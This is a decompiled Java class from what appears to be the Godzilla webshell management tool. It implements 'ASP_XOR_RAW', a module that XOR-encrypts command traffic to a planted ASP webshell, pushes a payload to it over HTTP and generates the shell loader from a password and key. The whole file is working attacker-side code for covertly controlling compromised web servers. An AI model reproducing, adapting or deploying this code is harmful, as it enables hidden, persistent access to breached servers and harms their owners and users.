/*    */ package shells.cryptions.aspXor;
/*    */ 
/*    */ import core.annotation.CryptionAnnotation;
/*    */ import core.shell.ShellEntity;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ @CryptionAnnotation(Name = "ASP_XOR_RAW", payloadName = "AspDynamicPayload")
/*    */ public class AspXorRaw
/*    */   extends AspXorBae64 {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private byte[] key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 19 */     this.shell = context;
/* 20 */     this.http = this.shell.getHttp();
/* 21 */     this.key = this.shell.getSecretKeyX().getBytes();
/* 22 */     this.shell.getHeaders().put("Content-Type", "application/octet-stream");
/*    */     try {
/* 24 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 25 */       if (this.payload != null) {
/* 26 */         this.http.sendHttpResponse(this.payload);
/* 27 */         this.state = true;
/*    */       } else {
/* 29 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 32 */     } catch (Exception e) {
/* 33 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 42 */       decryption(data, this.key);
/* 43 */       return data;
/* 44 */     } catch (Exception e) {
/* 45 */       Log.error(e);
/* 46 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/* 53 */     if (data != null && data.length > 0) {
/*    */       try {
/* 55 */         decryption(data, this.key);
/* 56 */         return data;
/* 57 */       } catch (Exception e) {
/* 58 */         Log.error(e);
/* 59 */         return null;
/*    */       } 
/*    */     }
/* 62 */     return data;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 70 */     return false;
/*    */   }
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 75 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 81 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), getClass().getSimpleName());
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\aspXor\AspXorRaw.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */